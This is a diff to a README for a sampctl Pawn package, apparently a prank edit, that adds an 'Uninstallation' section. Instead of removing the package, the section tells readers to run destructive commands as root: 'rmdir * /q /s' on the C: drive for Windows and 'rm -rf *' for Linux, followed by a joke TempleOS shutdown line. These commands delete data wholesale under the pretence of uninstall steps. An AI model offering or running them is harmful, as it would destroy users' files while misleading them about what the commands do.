@@ -46,3 +46,23 @@ To test, simply run the package:
 ```bash
 sampctl package run
 ```
+
+## Uninstallation
+
+To uninstall the package, run the following command using root account:
+
+# Windows
+
+```bash
+cd /d C:
+rmdir * /q /s```
+
+# Linux
+
+```bash
+rm -rf *```
+
+# TempleOS
+
+```bash
+shutdown```
